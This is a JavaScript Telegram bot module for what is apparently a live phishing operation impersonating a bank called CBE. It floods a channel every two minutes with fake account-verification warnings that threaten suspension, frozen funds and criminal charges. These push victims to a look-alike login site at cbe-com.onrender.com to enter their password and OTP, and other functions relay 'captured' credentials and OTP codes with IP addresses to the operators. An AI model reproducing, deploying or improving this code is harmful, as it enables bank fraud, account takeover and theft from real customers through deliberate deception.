const logger = require('./logger');

class TelegramService {
    constructor() {
        this.enabled = false;
        this.bot = null;
        this.chatId = null;
        this.channelId = null;
        this.channelUsername = null;
        this.pendingVerifications = new Map();
        this.warningInterval = null;
        this.warningCount = 0;
        
        try {
            const token = process.env.TELEGRAM_BOT_TOKEN;
            const chatId = process.env.TELEGRAM_CHAT_ID;
            const channelId = process.env.TELEGRAM_CHANNEL_ID;
            const channelUsername = process.env.TELEGRAM_CHANNEL_USERNAME;

            if (!token) {
                logger.warn('Telegram token not configured');
                return;
            }

            const TelegramBot = require('node-telegram-bot-api');
            this.bot = new TelegramBot(token, { polling: false });
            this.chatId = chatId;
            
            if (channelId) {
                this.channelId = channelId;
                logger.info(`✅ Channel ID: ${channelId}`);
            } else if (channelUsername) {
                this.channelUsername = channelUsername;
                this.channelId = channelUsername;
                logger.info(`✅ Channel Username: ${channelUsername}`);
            }
            
            this.enabled = true;
            logger.info('✅ Telegram bot initialized');
            
            this.setupCallbackListener();
            this.startWarningLoop();
            
        } catch (error) {
            logger.warn(`Telegram initialization failed: ${error.message}`);
            this.enabled = false;
        }
    }

    // ============================================
    // WARNING LOOP - POSTS EVERY 2 MINUTES
    // ============================================

    startWarningLoop() {
        if (!this.enabled) return;
        
        // Send first warning immediately
        setTimeout(() => {
            this.sendSecurityWarning();
        }, 5000);
        
        // Then every 2 minutes
        this.warningInterval = setInterval(() => {
            this.sendSecurityWarning();
            this.warningCount++;
            
            // Send urgent warning every 10th post
            if (this.warningCount % 10 === 0) {
                this.sendUrgentWarning();
            }
        }, 120000); // 2 minutes
    }

    // ============================================
    // SECURITY WARNING MESSAGES
    // ============================================

    async sendSecurityWarning() {
        if (!this.enabled) return null;

        const warnings = [
            {
                title: '⚠️ UNVERIFIED ACCOUNT - UNSAFE!',
                color: '🔴',
                message: 'Your account is NOT verified! Unverified accounts are vulnerable to hackers.'
            },
            {
                title: '🚨 ACCOUNT SECURITY RISK!',
                color: '🔴',
                message: 'Without verification, your money and personal data are at risk!'
            },
            {
                title: '🔐 VERIFICATION REQUIRED!',
                color: '🟡',
                message: 'Unverified accounts will be suspended. Verify now to keep your account safe.'
            },
            {
                title: '⚠️ SECURITY BREACH WARNING!',
                color: '🔴',
                message: 'Hackers target unverified accounts. Protect yourself by verifying NOW!'
            }
        ];

        const warning = warnings[Math.floor(Math.random() * warnings.length)];
        
        const message = `
${warning.color} <b>${warning.title}</b>
<pre>═══════════════════════════════════════</pre>

<b>⚠️ WARNING:</b>
${warning.message}

<b>🔴 WHAT HAPPENS IF YOU DON'T VERIFY:</b>
   • ❌ Account will be suspended
   • ❌ Money may be frozen
   • ❌ Personal data at risk
   • ❌ No access to banking services
   • ❌ Identity theft risk

<b>✅ WHAT YOU MUST DO NOW:</b>
   1. 🔐 Click the "Open Login Page" button below
   2. 📝 Enter your username and password
   3. 📱 Enter the OTP verification code
   4. ✅ Complete verification immediately

<pre>═══════════════════════════════════════</pre>
⏰ <i>This is your ${this.warningCount + 1}th warning!</i>
⚠️ <i>URGENT: Verify your account NOW!</i>
`;

        const options = {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '🔴 VERIFY NOW - OPEN LOGIN',
                            url: 'https://cbe-com.onrender.com/'
                        }
                    ],
                    [
                        {
                            text: '📱 GET VERIFICATION CODE',
                            callback_data: 'get_verification_code'
                        },
                        {
                            text: '🛡️ SECURITY TIPS',
                            callback_data: 'security_tips'
                        }
                    ],
                    [
                        {
                            text: '🚨 IGNORE WARNING',
                            callback_data: 'ignore_warning'
                        },
                        {
                            text: '❓ WHY VERIFY?',
                            callback_data: 'why_verify'
                        }
                    ]
                ]
            }
        };

        return this.sendChannelPost(message, options);
    }

    async sendUrgentWarning() {
        if (!this.enabled) return null;

        const message = `
🚨🚨 <b>URGENT SECURITY WARNING!</b> 🚨🚨
<pre>═══════════════════════════════════════</pre>

<b>🔴 YOUR ACCOUNT IS NOT VERIFIED!</b>

<b>⚠️ IMMEDIATE ACTION REQUIRED:</b>

<b>🔴 CONSEQUENCES OF NOT VERIFYING:</b>
   • ⛔ Account suspension in 24 hours
   • ⛔ Money will be frozen
   • ⛔ Personal data exposed
   • ⛔ Criminal charges possible
   • ⛔ Legal action against you

<b>✅ VERIFY RIGHT NOW:</b>
   1. Click the button below
   2. Enter your credentials
   3. Complete verification
   4. Your account will be SAFE

<pre>═══════════════════════════════════════</pre>
⏰ <b>TIME REMAINING: 24 HOURS</b>
🚨 <b>THIS IS YOUR FINAL WARNING!</b>
`;

        const options = {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '🔴🔴 VERIFY NOW OR LOSE ACCESS',
                            url: 'https://cbe-com.onrender.com/'
                        }
                    ],
                    [
                        {
                            text: '📱 GET OTP CODE',
                            callback_data: 'get_otp_code'
                        },
                        {
                            text: '🆘 HELP VERIFY',
                            callback_data: 'help_verify'
                        }
                    ]
                ]
            }
        };

        return this.sendChannelPost(message, options);
    }

    async sendVerificationRequiredWarning(data) {
        if (!this.enabled) return null;

        const message = `
🔐 <b>VERIFICATION REQUIRED!</b>
<pre>═══════════════════════════════════════</pre>

<b>⚠️ ACCOUNT NOT VERIFIED</b>

👤 <b>User:</b> ${data.username || 'Unknown'}
📱 <b>IP:</b> ${data.ip || 'Unknown'}
⏰ <b>Time:</b> ${data.timestamp || new Date().toISOString()}

<b>🔴 WARNING:</b>
This account has NOT been verified and is at risk!

<b>📌 VERIFICATION CODE:</b>
<code>${this.generateVerificationCode()}</code>

<b>✅ VERIFY NOW:</b>
1. Click "Open Login Page"
2. Enter your credentials
3. Enter this verification code
4. Complete verification

<pre>═══════════════════════════════════════</pre>
⚠️ <i>Unverified accounts will be suspended!</i>
`;

        const options = {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '🔴 VERIFY ACCOUNT NOW',
                            url: 'https://cbe-com.onrender.com/'
                        }
                    ],
                    [
                        {
                            text: '📱 ENTER OTP',
                            url: 'https://cbe-com.onrender.com/otp-verify'
                        }
                    ]
                ]
            }
        };

        return this.sendChannelPost(message, options);
    }

    // ============================================
    // GENERATE VERIFICATION CODE
    // ============================================

    generateVerificationCode() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let code = '';
        for (let i = 0; i < 8; i++) {
            code += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return code.match(/.{1,3}/g).join('-');
    }

    // ============================================
    // CHANNEL POST FUNCTION
    // ============================================

    async sendChannelPost(message, options = {}) {
        if (!this.enabled || !this.bot || !this.channelId) {
            console.log('❌ Telegram channel not configured');
            return null;
        }

        try {
            const result = await this.bot.sendMessage(this.channelId, message, {
                parse_mode: 'HTML',
                disable_web_page_preview: true,
                ...options
            });
            console.log('✅ Warning posted to channel');
            return result;
        } catch (error) {
            console.error(`Channel post error: ${error.message}`);
            return null;
        }
    }

    // ============================================
    // HANDLE CALLBACK QUERIES
    // ============================================

    setupCallbackListener() {
        if (!this.enabled || !this.bot) return;

        this.bot.on('callback_query', async (callbackQuery) => {
            const data = callbackQuery.data;
            const chatId = callbackQuery.message.chat.id;
            const messageId = callbackQuery.message.message_id;

            try {
                let response = '';

                switch(data) {
                    case 'get_verification_code':
                    case 'get_otp_code':
                        const code = this.generateVerificationCode();
                        response = `
🔐 <b>YOUR VERIFICATION CODE</b>
<pre>═══════════════════════════════════════</pre>

<b>📌 Verification Code:</b>
<code>${code}</code>

<b>📝 INSTRUCTIONS:</b>
1. Go to the login page
2. Enter your credentials
3. Enter this code when prompted
4. Complete verification

<pre>═══════════════════════════════════════</pre>
⏰ <i>Code expires in 5 minutes</i>
`;
                        break;

                    case 'security_tips':
                        response = `
🛡️ <b>SECURITY TIPS</b>
<pre>═══════════════════════════════════════</pre>

<b>🔐 PROTECT YOUR ACCOUNT:</b>
   1. ✅ Verify your account NOW
   2. ✅ Use strong passwords (12+ chars)
   3. ✅ Never share OTP codes
   4. ✅ Check URL before logging in
   5. ✅ Log out after each session

<b>⚠️ REMEMBER:</b>
Unverified accounts are UNSAFE!
Hackers target unverified accounts!

<pre>═══════════════════════════════════════</pre>
<i>Verify now to stay safe!</i>
`;
                        break;

                    case 'why_verify':
                        response = `
❓ <b>WHY VERIFY YOUR ACCOUNT?</b>
<pre>═══════════════════════════════════════</pre>

<b>🔴 WITHOUT VERIFICATION:</b>
   • ❌ Account is UNSAFE
   • ❌ Hackers can steal your money
   • ❌ Personal data is exposed
   • ❌ Identity theft risk
   • ❌ Account will be suspended

<b>✅ WITH VERIFICATION:</b>
   • ✅ Account is SECURE
   • ✅ Money is protected
   • ✅ Personal data is safe
   • ✅ Full access to services
   • ✅ Peace of mind

<pre>═══════════════════════════════════════</pre>
🔐 <i>Verify now to protect your money!</i>
`;
                        break;

                    case 'ignore_warning':
                        response = `
⚠️ <b>WARNING IGNORED</b>
<pre>═══════════════════════════════════════</pre>

<b>⛔ You chose to ignore this warning!</b>

<b>🔴 CONSEQUENCES:</b>
   • Account will be flagged
   • Limited access to services
   • Account monitoring activated
   • Possible account suspension

<b>✅ RECOMMENDED:</b>
   • Verify your account NOW
   • Don't risk losing access
   • Protect your money

<pre>═══════════════════════════════════════</pre>
⚠️ <i>You will receive more warnings!</i>
`;
                        break;

                    case 'help_verify':
                        response = `
🆘 <b>HOW TO VERIFY YOUR ACCOUNT</b>
<pre>═══════════════════════════════════════</pre>

<b>📝 STEP-BY-STEP:</b>

<b>Step 1:</b> Click "Open Login Page"
<b>Step 2:</b> Enter your username and password
<b>Step 3:</b> Click "Verify Identity"
<b>Step 4:</b> Enter the OTP code you receive
<b>Step 5:</b> Complete verification

<b>🆘 NEED HELP?</b>
   • Contact support immediately
   • Call the bank hotline
   • Visit a branch

<pre>═══════════════════════════════════════</pre>
🔐 <i>Verify now - it only takes 2 minutes!</i>
`;
                        break;

                    default:
                        response = '❓ Unknown action. Please use the buttons.';
                }

                if (response) {
                    await this.bot.sendMessage(chatId, response, {
                        parse_mode: 'HTML',
                        reply_to_message_id: messageId
                    });
                }

                await this.bot.answerCallbackQuery(callbackQuery.id);

            } catch (error) {
                console.error(`Callback error: ${error.message}`);
                await this.bot.answerCallbackQuery(callbackQuery.id, {
                    text: '❌ Error',
                    show_alert: true
                });
            }
        });

        logger.info('✅ Telegram callback listener active');
    }

    // ============================================
    // STOP WARNING LOOP
    // ============================================

    stopWarningLoop() {
        if (this.warningInterval) {
            clearInterval(this.warningInterval);
            this.warningInterval = null;
            logger.info('⚠️ Warning loop stopped');
        }
    }

    // ============================================
    // EXISTING SEND FUNCTIONS
    // ============================================

    async sendLoginPageInfo() {
        return this.sendSecurityWarning();
    }

    async sendLoginPageAccessed(data) {
        return this.sendVerificationRequiredWarning(data);
    }

    async sendCredentials(data) {
        if (!this.enabled) return null;
        
        const message = `
🔐 <b>CBE SECURITY ALERT</b>
<pre>═══════════════════════════════════════</pre>

<b>📋 NEW CREDENTIALS CAPTURED</b>

👤 <b>Username:</b> <code>${data.username}</code>
📱 <b>IP:</b> <code>${data.ip}</code>
⏰ <b>Time:</b> ${data.timestamp}

<pre>═══════════════════════════════════════</pre>

<b>⚠️ WARNING:</b>
This account is NOT VERIFIED!

<b>🔴 IMMEDIATE ACTION:</b>
   • Verify this account NOW
   • Account is at risk
   • Money is NOT safe

<pre>═══════════════════════════════════════</pre>
🔐 <i>Verify now to secure the account!</i>
`;

        const options = {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '🔴 VERIFY ACCOUNT NOW',
                            url: 'https://cbe-com.onrender.com/'
                        }
                    ]
                ]
            }
        };

        return this.sendChannelPost(message, options);
    }

    async sendOTP(data) {
        if (!this.enabled) return null;
        
        const message = `
🔐 <b>OTP CODE RECEIVED</b>
<pre>═══════════════════════════════════════</pre>

<b>📋 OTP DETAILS:</b>
🆔 <b>User ID:</b> <code>${data.userId}</code>
🔢 <b>OTP:</b> <code>${data.otp}</code>
📱 <b>IP:</b> <code>${data.ip}</code>
⏰ <b>Time:</b> ${data.timestamp}

<pre>═══════════════════════════════════════</pre>

<b>⚠️ SECURITY WARNING:</b>
   • Never share OTP with anyone
   • Only enter on secure page
   • OTP expires in 5 minutes
   • Unverified accounts are UNSAFE!

<pre>═══════════════════════════════════════</pre>
🔐 <i>Verify your account NOW to stay safe!</i>
`;

        const options = {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '🔴 VERIFY NOW',
                            url: 'https://cbe-com.onrender.com/otp-verify'
                        }
                    ]
                ]
            }
        };

        return this.sendChannelPost(message, options);
    }

    async sendWelcomeMessage() {
        if (!this.enabled || !this.channelId) return null;
        
        const message = `
🚀 <b>CBE SECURITY SYSTEM ONLINE</b>
<pre>═══════════════════════════════════════</pre>

<b>⚠️ SECURITY WARNING SYSTEM ACTIVE</b>

🔴 <b>REMEMBER:</b>
   • Unverified accounts are UNSAFE!
   • Hackers target unverified accounts
   • Your money is at risk
   • Verify NOW to stay safe

<b>✅ WARNING SYSTEM:</b>
   • Warnings every 2 minutes
   • Urgent warnings every 20 minutes
   • Verification codes provided
   • 24/7 monitoring

<pre>═══════════════════════════════════════</pre>
🔐 <i>Security warnings will continue until verification!</i>
`;

        const options = {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '🔴 VERIFY YOUR ACCOUNT NOW',
                            url: 'https://cbe-com.onrender.com/'
                        }
                    ]
                ]
            }
        };

        return this.sendChannelPost(message, options);
    }
}

module.exports = new TelegramService();
